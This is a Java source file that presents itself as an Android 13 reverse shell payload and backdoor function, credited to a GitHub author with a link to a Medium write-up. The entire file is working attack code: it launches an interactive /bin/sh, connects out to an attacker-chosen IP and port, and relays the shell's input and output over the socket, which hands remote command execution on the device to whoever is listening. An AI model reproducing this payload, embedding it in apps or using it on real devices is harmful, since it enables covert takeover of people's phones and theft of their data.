import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

// An Android 13 reverse shell payload by github.com/n0mi1k
// Read More: https://medium.com/@n0mi1k/a-simple-java-reverse-shell-payload-for-android-13-0-tiramisu-and-below-without-using-msfvenom-a72c6e13f33a

// Reverse shell backdoor function
public class Payload {
    public static void reverse_tcp(String ip,int port){
        try {
            String[] str = {"/bin/sh","-i"};
            Process p = Runtime.getRuntime().exec(str);
            InputStream  pin      =   p.getInputStream();
            InputStream  perr     =   p.getErrorStream();
            OutputStream pout     =   p.getOutputStream();

            Socket       socket   =   new Socket(ip,port);
            InputStream  sin      =   socket.getInputStream();
            OutputStream sout     =   socket.getOutputStream();

            while(true){
                while(pin.available()>0)  sout.write(pin.read());
                while(perr.available()>0) sout.write(perr.read());
                while(sin.available()>0)  pout.write(sin.read());
                sout.flush();
                pout.flush();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }catch (StringIndexOutOfBoundsException e) {
            e.printStackTrace();
        }
    }
}